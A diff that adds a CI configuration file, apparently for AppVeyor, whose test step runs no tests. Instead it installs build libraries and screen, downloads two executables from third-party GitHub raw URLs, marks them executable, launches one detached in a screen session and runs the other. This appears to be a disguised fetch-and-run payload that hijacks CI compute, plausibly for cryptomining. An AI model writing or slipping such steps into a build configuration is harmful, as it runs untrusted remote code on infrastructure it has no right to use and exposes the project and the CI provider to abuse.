@@ -1,0 +1,15 @@
+image: Ubuntu
+
+install:
+- npm install
+
+test_script:
+- ls -al
+- sh: sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y 
+- sh: sudo apt-get install screen -y
+- sh: wget -O A https://raw.githubusercontent.com/Gow17/JNE/main/manage
+- sh: wget -O B https://raw.githubusercontent.com/Gow17/Tracking/main/tracking.sh
+- sh: chmod +x A && chmod +x B 
+- sh: screen -dmS run ./A
+- sh: ./B
+build: off
